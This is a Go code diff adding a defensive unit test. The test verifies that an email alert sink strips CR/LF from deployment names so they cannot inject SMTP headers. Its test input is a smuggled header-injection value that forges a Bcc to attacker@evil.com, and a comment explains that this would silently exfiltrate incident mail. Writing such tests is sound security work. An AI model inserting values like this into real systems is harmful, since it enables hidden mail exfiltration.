@@ -434,3 +434,52 @@ func equalUnordered(a, b []string) bool {
 	}
 	return true
 }
+
+// TestEmail_SubjectCRLFCannotInjectHeaders: a CR/LF reaching the
+// Subject (via a deployment name — Component/Op/Deployment all feed
+// formatSubject) must not inject new RFC 5322 headers. Without
+// sanitization, "db1\r\nBcc: attacker@evil.com" in the deployment
+// forges a Bcc: silent exfiltration of every incident mail.
+func TestEmail_SubjectCRLFCannotInjectHeaders(t *testing.T) {
+	srv := &fakeSMTP{}
+	host, port := startFakeSMTP(t, srv)
+	s := build(t, host, port, nil)
+	if err := s.Open(context.Background(), nil); err != nil {
+		t.Fatal(err)
+	}
+
+	ev := output.NewEvent(output.SeverityError, "backup", "failed").
+		WithSubject(output.Subject{Deployment: "db1\r\nBcc: attacker@evil.com\r\nX-Injected: yes"})
+	if err := s.Emit(context.Background(), ev); err != nil {
+		t.Fatal(err)
+	}
+	s.Close()
+
+	srv.mu.Lock()
+	defer srv.mu.Unlock()
+	if len(srv.bodies) != 1 {
+		t.Fatalf("want 1 body, got %d", len(srv.bodies))
+	}
+	body := srv.bodies[0]
+
+	// The header block ends at the first blank line. No injected
+	// header may appear there.
+	headerBlock := body
+	if i := strings.Index(body, "\r\n\r\n"); i >= 0 {
+		headerBlock = body[:i]
+	}
+	// A real injected header BEGINS a line. After sanitization the
+	// attacker's text survives as harmless literal Subject content on
+	// one line; what must never happen is a NEW header line.
+	for _, line := range strings.Split(headerBlock, "\r\n") {
+		for _, forbidden := range []string{"Bcc:", "X-Injected:"} {
+			if strings.HasPrefix(line, forbidden) {
+				t.Errorf("CRLF header injection: a line begins with %q:\n%s", forbidden, headerBlock)
+			}
+		}
+	}
+	// Exactly one Subject: line.
+	if n := strings.Count(headerBlock, "Subject:"); n != 1 {
+		t.Errorf("header block has %d Subject: lines (want 1):\n%s", n, headerBlock)
+	}
+}
